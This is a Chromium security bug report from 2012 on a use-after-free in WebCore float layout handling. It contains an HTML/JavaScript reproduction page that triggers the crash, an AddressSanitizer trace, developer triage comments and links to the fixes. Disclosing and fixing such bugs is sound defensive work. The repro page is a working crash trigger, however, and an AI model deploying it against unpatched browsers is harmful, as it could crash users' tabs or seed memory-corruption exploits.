# Security: use-after-free in WebCore::RenderBoxModelObject::hasSelfPaintingLayer()

| Field | Value |
|-------|-------|
| **Issue ID** | [40056183](https://issues.chromium.org/issues/40056183) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-04-04 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::RenderBoxModelObject::hasSelfPaintingLayer()

**VERSION**  

Chrome Version: dev

Chromium 20.0.1092.0 (Developer Build 130586)  

OS Linux  

WebKit 536.6 (@113153)

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
float: left;
}
#el1 {
padding-top: 1em;
padding-bottom: 1em;
margin-bottom: 1em;
display: table;
-webkit-margin-before: -100px;
}
</style>
<script>
onload = function() {
document.body.appendChild(document.createElement('select'))
el0=document.createElement('hr')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElement('div')
el1.setAttribute('id','el1')
document.body.appendChild(el1)
el1.appendChild(document.createElement('textarea'))
el2=document.createElement('div')
document.body.appendChild(el2)
el2.appendChild(document.createElement('input'))
document.body.offsetTop
document.body.removeChild(el0)
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab + asan  

Crash State:

==28339== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffeca3eeb8 at pc 0x55555ab913d7 bp 0x7fffffff74a0 sp 0x7fffffff7498  

READ of size 8 at 0x7fffeca3eeb8 thread T0  

#0 0x55555ab913d7 in WebCore::RenderBoxModelObject::hasSelfPaintingLayer() const ???:0  

#1 0x55555aab07f4 in WebCore::RenderBlock::addOverhangingFloats(WebCore::RenderBlock\*, bool) ???:0

0x7fffeca3eeb8 is located 56 bytes inside of 184-byte region [0x7fffeca3ee80,0x7fffeca3ef38)  

freed by thread T0 here:  

#0 0x55555df1f772 in free ??:0  

#1 0x5555592c5e47 in WebCore::Node::detach() ???:0  

#2 0x55555928989d in WebCore::Element::detach() ???:0

## Attachments

- [56184.html](attachments/56184.html) (text/html; charset=us-ascii, 924 B)
- [56184.txt](attachments/56184.txt) (text/x-c; charset=us-ascii, 10.2 KB)

## Timeline

### in...@chromium.org (2012-04-04)

Ken, this stack looks similar to http://code.google.com/p/chromium/issues/detail?id=106413.

### pa...@chromium.org (2012-04-04)

Ken, can I therefore assign it to you? :) Feel free to punt it right back to me.

I can only repro it on ToT, not 18. It might yet turn out to work on 19, though; I'll try.

### pa...@chromium.org (2012-04-04)

[Empty comment from Monorail migration]

### ke...@chromium.org (2012-04-04)

Another float issue... leave it with me and I'll put it in my queue. I just uploaded to cluster-fuzz to see if we can get a regression range. Crossing my fingers I didn't cause it (which is probably about even odds based on reading the test case).

### ke...@chromium.org (2012-04-04)

It's not my regression, but cluster-fuzz isn't reproducing. It might be a special case of the same bug in 106413 that my patch doesn't catch for some reason. I'll have a closer look later on.

### in...@chromium.org (2012-04-05)

I know what is going wrong here with floats here..stealing... :)

### in...@chromium.org (2012-04-09)

Chris, this easily reproduces under ASAN on m18. We should always try with the memory debugging tool or under chrome without ASAN, please use the --js-flags="--expose-gc" flag to force gc.

### in...@chromium.org (2012-04-11)

http://trac.webkit.org/changeset/113825

### sc...@gmail.com (2012-04-23)

M18: http://trac.webkit.org/changeset/114948
M19: http://trac.webkit.org/changeset/114949

### in...@chromium.org (2012-04-24)

Thanks Miaubiz for helping to cleanse the float bugs. They are nasty. This qualifies for $1000 Chromium Security Reward.

### in...@chromium.org (2012-04-24)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/121899?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056183)*
